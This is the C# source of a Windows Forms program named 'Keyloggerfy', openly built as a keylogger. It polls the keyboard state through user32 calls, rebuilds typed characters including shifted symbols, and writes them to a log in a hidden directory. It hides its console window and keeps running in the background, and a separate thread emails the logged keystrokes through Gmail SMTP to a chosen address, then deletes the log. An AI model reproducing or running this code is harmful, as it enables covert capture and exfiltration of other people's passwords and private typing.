using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Keyloggerfy
{
    public partial class main : Form
    {
        public main()
        {
            InitializeComponent();
        }


        #region PANEL BARRA TITULO             
        //BOTONES DEL PANEL DE TITULO
        private void btnCerrar_Click(object sender, EventArgs e)
        {
            var confirmarSalida = MessageBox.Show("Do you want the application to continue running in the background? " +
                "\n\nNote: If you click 'No' the application will close completely.",
                "What you wanna do?", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);

            if (confirmarSalida == DialogResult.Yes)
            {
                //Just closes the form but keeps the threads running in the background
                this.Close();
            }
            else if (confirmarSalida == DialogResult.No)
            {
                //Exits completely from the application
                Environment.Exit(0);
            }
        }

        //Capturar posicion y tamaño antes de maximizar para restaurar        
        private void panelBarraTitulo_MouseMove(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.Handle, 0x112, 0xf012, 0);
        }

        private void btnMinimizar_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        #endregion

        #region METODOS NATIVOS KEYLOGGER
        //METODO PARA ARRASTRAR EL FORMULARIO
        [System.Runtime.InteropServices.DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private extern static void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private extern static void SendMessage(System.IntPtr hWnd, int wMsg, int wParam, int lParam);

        //METODOS PARA ACCEDER A LA CAPTURA DE TECLAS
        [DllImport("User32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        #endregion

        public const string alfabeto = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";       

        static void Start(int hourOne, int hourTwo)
        {
            string[] numeros = { "D1", "D2", "D3", "D4", "D5", "D6", "D7", "D8", "D9", "D0" };
            string[] specialChars = { "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "" };
            Mutex mut = new Mutex();
            string driveName = DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Fixed).FirstOrDefault().Name;
            string path = driveName + "%Temp%\\" + "%TempLog%.txt";
            while (true)
            {                
                TimeSpan timeStart = new TimeSpan(hourOne, 0, 0);
                TimeSpan timeEnd = new TimeSpan(hourTwo, 0, 0);
                TimeSpan now = DateTime.Now.TimeOfDay; 
                if (now > timeStart || now < timeEnd)
                {
                    Thread.Sleep(10);
                    for (int i = 0; i < 255; i++)
                    {
                        int keyState = GetAsyncKeyState(i);
                        if (keyState == 1 || keyState == -32767)
                        {

                            bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                            bool shift = Control.ModifierKeys == Keys.Shift;
                            string toStringText = Convert.ToString((Keys)i);
                            if (numeros.Contains(toStringText) && !shift)
                            {
                                string number = Convert.ToString(toStringText.ToArray()[1]);
                                toStringText = number;
                            }
                            if (alfabeto.Contains(toStringText))
                            {
                                if (!CapsLock && !(shift))
                                {
                                    toStringText = toStringText.ToLower();
                                }
                            }
                            else if (numeros.Contains(toStringText))
                            {
                                if (shift)
                                {
                                    switch (toStringText)
                                    {
                                        case "D1": { toStringText = "!"; break; }
                                        case "D2": { toStringText = "@"; break; }
                                        case "D3": { toStringText = "#"; break; }
                                        case "D4": { toStringText = "$"; break; }
                                        case "D5": { toStringText = "%"; break; }
                                        case "D6": { toStringText = "^"; break; }
                                        case "D7": { toStringText = "&"; break; }
                                        case "D8": { toStringText = "*"; break; }
                                        case "D9": { toStringText = "("; break; }
                                        case "D0": { toStringText = ")"; break; }
                                        default: { break; }
                                    }
                                }
                            }
                            else if (toStringText.Contains("Oem") || string.Compare(toStringText, "Space") == 0)
                            {
                                switch (toStringText)
                                {
                                    case "Oemtilde": { toStringText = shift ? "~" : "`"; break; }
                                    case "OemMinus": { toStringText = shift ? "_" : "-"; break; }
                                    case "Oemplus": { toStringText = shift ? "+" : "="; break; }
                                    case "OemOpenBrackets": { toStringText = shift ? "{" : "["; break; }
                                    case "Oem6": { toStringText = shift ? "}" : "]"; break; }
                                    case "Oem5": { toStringText = shift ? "|" : "\\"; break; }
                                    case "Oem1": { toStringText = shift ? ":" : ";"; break; }
                                    case "Oem7": { toStringText = shift ? "\"" : "'"; break; }
                                    case "Oemcomma": { toStringText = shift ? "<" : ","; break; }
                                    case "OemPeriod": { toStringText = shift ? ">" : "."; break; }
                                    case "OemQuestion": { toStringText = shift ? "?" : "/"; break; }
                                    case "Space": { toStringText = " "; break; }
                                    default: { break; }
                                }
                            }
                            else if (string.Compare(toStringText, "ShiftKey") == 0 || string.Compare(toStringText, "RShiftKey") == 0 || string.Compare(toStringText, "LShiftKey") == 0)
                            {
                                toStringText = "";
                            }
                            else
                            {
                                toStringText = Environment.NewLine + toStringText + Environment.NewLine;
                            }

                            mut.WaitOne();

                            File.AppendAllText(path, toStringText);
                            Console.Write(toStringText);

                            mut.ReleaseMutex();

                            break;
                        }
                    }
                }
            }
        }
        
        static void sendMail(int hourOne, int hourTwo, String mailTo, String mailFrom, String password)
        {
            Mutex mut = new Mutex();
            string driveName = DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Fixed).FirstOrDefault().Name;
            string path = driveName + "%Temp%\\" + "%TempLog%.txt";
            while (true)
            {
                TimeSpan timeStart = new TimeSpan(hourOne, 0, 0);
                TimeSpan timeEnd = new TimeSpan(hourTwo, 0, 0);
                TimeSpan now = DateTime.Now.TimeOfDay;
                if (now > timeStart || now < timeEnd)
                {

                    DateTime previous_time = DateTime.Now;
                    //SENDS AN E-MAIL WITH THE KeysStroked EVERY 10 MINUTES
                    Thread.Sleep(60000);

                    MailAddress to = new MailAddress(mailTo);
                    
                    MailAddress from = new MailAddress(mailFrom);

                    MailMessage mail = new MailMessage(from, to);

                    mail.Subject = "KeysStroked between " + previous_time + " and " + DateTime.Now;

                    using(SmtpClient smtp = new SmtpClient())
                    {
                        if (File.Exists(path))
                        {
                            mut.WaitOne();
                            mail.Body = File.ReadAllText(path);
                            mut.ReleaseMutex();
                            //SmtpClient smtp = new SmtpClient();

                            smtp.Host = "smtp.gmail.com";

                            smtp.Port = 587;
                            smtp.EnableSsl = true;

                            smtp.DeliveryMethod = SmtpDeliveryMethod.Network;

                            smtp.UseDefaultCredentials = false;

                            smtp.Credentials = new NetworkCredential(
                                mailFrom, password);

                            smtp.Send(mail);
                            mut.WaitOne();
                            File.Delete(path);
                            mut.ReleaseMutex();
                        }
                    }                    
                }
            }
        }
        
        Int32 hourOne;
        Int32 hourTwo;
        String mailTo;
        String mailFrom;
        String password;

        private void btnComenzar_Click(object sender, EventArgs e)
        {            
            if(cboxTimeStart.SelectedItem == null || cboxTimeEnd.SelectedItem == null || String.IsNullOrWhiteSpace(txbMailTo.Text)
                || String.IsNullOrWhiteSpace(txbMailFrom.Text) || String.IsNullOrWhiteSpace(txbPassword.Text) )
            {
                MessageBox.Show("You need to fill all the boxes dude",
                "Hey, you forgot something...", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                var handle = GetConsoleWindow();

                //Esconder consola de windows
                ShowWindow(handle, SW_HIDE);

                string driveName = DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Fixed).FirstOrDefault().Name;
                string path = driveName + "%Temp%\\";

                DirectoryInfo di = Directory.CreateDirectory(path);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                //Capturo los datos ingresados
                hourOne = Convert.ToInt32(cboxTimeStart.SelectedItem);
                hourTwo = Convert.ToInt32(cboxTimeEnd.SelectedItem);
                mailTo = txbMailTo.Text;
                mailFrom = txbMailFrom.Text;
                password = txbPassword.Text;         

                Thread thread_Logger = new Thread(() =>
                {
                    Start(hourOne, hourTwo);
                });
                thread_Logger.Start();

                Thread thread_Mail = new Thread(() =>
                {
                    sendMail(hourOne, hourTwo, mailTo, mailFrom, password);
                });
                thread_Mail.Start();

                MessageBox.Show("Nice, everything running as expected, now you can close Keyloggerfy, read close the exit message.",
                "Thats it", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }            
        }        
    }
}
